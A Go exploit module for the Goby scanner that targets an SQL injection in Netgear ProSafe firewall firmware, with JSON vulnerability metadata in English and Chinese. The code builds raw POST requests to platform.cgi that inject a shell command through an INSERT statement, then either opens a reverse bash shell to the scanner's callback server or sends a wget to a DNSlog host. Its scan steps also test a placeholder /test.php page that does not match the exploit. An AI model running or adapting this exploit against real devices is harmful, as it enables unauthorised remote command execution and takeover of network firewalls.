package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Netgear ProSafe Firewall  SQL Injection Vulnerability",
    "Description": "<p>Netgear ProSafe Firewall is a ProSafe wireless routing VPN firewall owned by Netgear Corporation.</p><p>Netgear ProSafe Firewall  firmware version 4.3.5-3 and earlier has SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Product": "NETGEAR-ProSafe",
    "Homepage": "https://www.netgear.com/",
    "DisclosureDate": "2022-08-13",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "(banner=\"FVS318\" || (header=\"Netgear\" && body=\"top.html\"))",
    "GobyQuery": "(banner=\"FVS318\" || (header=\"Netgear\" && body=\"top.html\"))",
    "Level": "3",
    "Impact": "<p>Netgear ProSafe firmware version 4.3.5-3 and earlier has SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "reverseShell,DNSlog",
            "show": ""
        },
        {
            "name": "DNSlog",
            "type": "input",
            "value": "",
            "show": "AttackType=DNSlog"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "Netgear ProSafe 防火墙 SQL 注入漏洞",
            "Product": "NETGEAR-ProSafe",
            "Description": "<p>Netgear ProSafe 防火墙是美国网件公司旗下一款 ProSafe 无线路由 VPN 防火墙。</p><p>Netgear ProSafe 防火墙固件版本 4.3.5-3 及之前存在SQL注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Netgear ProSafe 固件版本 4.3.5-3 之前存在SQL注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Netgear ProSafe Firewall  SQL Injection Vulnerability",
            "Product": "NETGEAR-ProSafe",
            "Description": "<p>Netgear ProSafe Firewall is a ProSafe wireless routing VPN firewall owned by Netgear Corporation.<br></p><p>Netgear ProSafe Firewall  firmware version 4.3.5-3 and earlier has SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.netgear.com/\">https://www.netgear.com/</a><br></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Netgear ProSafe firmware version 4.3.5-3 and earlier has SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`
	sendPayloadzcd321 := func(conn net.Conn, payload string) string {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			return ""
		}
		resp := make([]byte, 4096)
		_, err = conn.Read(resp)
		if err != nil {
			return ""
		}
		return string(resp)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			if len(checkUrl) == 0 {
				return false
			}
			cmd := "ping -c 2 " + checkUrl
			if !isDomain {
				cmd = "curl " + checkUrl
			}
			conn, err := httpclient.GetTCPConn(u.HostInfo)
			if err != nil {
				return false
			}
			data := fmt.Sprintf("'thispage=index.htm&USERDBUsers.UserName=;INSERT INTO USERDBUsers(UserName,GroupName,UserType,UserTimeOut,groupid,DenyLogin,DenyLoginFromWan,LoginFromIP,LoginFromBrowser,Password,LockoutEnable,MaxLockoutAttempts) values (\";%d;\",\"geardomain\",\"3\",\"5\",\"0\",\"0\",\"0\",\"0\",\"0\",\";%s\",\"1\",\"1\"); '&USERDBUsers.Password=aaaa&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login", time.Now().Unix(), cmd)
			payload := fmt.Sprintf("POST /scgi-bin/platform.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\r\n\r\n", u.HostInfo, len(data))
			payload += data
			sendPayloadzcd321(conn, payload)
			return godclient.PullExists(checkStr, 10*time.Second)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			conn, err := httpclient.GetTCPConn(expResult.HostInfo.HostInfo)
			if err != nil {
				return expResult
			}
			if ss.Params["AttackType"].(string) == "reverseShell" {
				waitSessionCh := make(chan string)
				// 第一步，要获取到反连端口 rp(rp就是拿到的监听端⼝)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					// 第二步，使用拿到的反连端口 rp 生成需要执行的命令
					//ReverseTCPByBash返回的是bash -i >& /dev/tcp/godserver/reverseport 也就是rp
					cmd := godclient.ReverseTCPByBash(rp)
					//ip := godclient.GetGodServerIP()
					//payload := godclient.GetGodServerHost()
					// 第三步，使用需要执行的命令生成 paylaod
					data := fmt.Sprintf("'thispage=index.htm&USERDBUsers.UserName=;INSERT INTO USERDBUsers(UserName,GroupName,UserType,UserTimeOut,groupid,DenyLogin,DenyLoginFromWan,LoginFromIP,LoginFromBrowser,Password,LockoutEnable,MaxLockoutAttempts) values (\";%d;\",\"geardomain\",\"3\",\"5\",\"0\",\"0\",\"0\",\"0\",\"0\",\";%s\",\"1\",\"1\"); '&USERDBUsers.Password=aaaa&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login", time.Now().Unix(), cmd)
					payload := fmt.Sprintf("POST /scgi-bin/platform.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\r\n\r\n", expResult.HostInfo.HostInfo, len(data))
					payload += data
					sendPayloadzcd321(conn, payload)
					// 固定格式，等待目标反弹 shell，若 15 秒内没收到连接请求，认为执行失败
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}

			} else if ss.Params["AttackType"].(string) == "DNSlog" {
				dnslog := ss.Params["DNSlog"].(string)
				cmd := "wget " + dnslog
				data := fmt.Sprintf("'thispage=index.htm&USERDBUsers.UserName=;INSERT INTO USERDBUsers(UserName,GroupName,UserType,UserTimeOut,groupid,DenyLogin,DenyLoginFromWan,LoginFromIP,LoginFromBrowser,Password,LockoutEnable,MaxLockoutAttempts) values (\";%d;\",\"geardomain\",\"3\",\"5\",\"0\",\"0\",\"0\",\"0\",\"0\",\";%s\",\"1\",\"1\"); '&USERDBUsers.Password=aaaa&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login", time.Now().Unix(), cmd)
				payload := fmt.Sprintf("POST /scgi-bin/platform.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\r\n\r\n", expResult.HostInfo.HostInfo, len(data))
				payload += data
				sendPayloadzcd321(conn, payload)
				expResult.Success = true
				expResult.Output = "Please check your DNSlog!"
				return expResult
			}
			return expResult
		},
	))
}
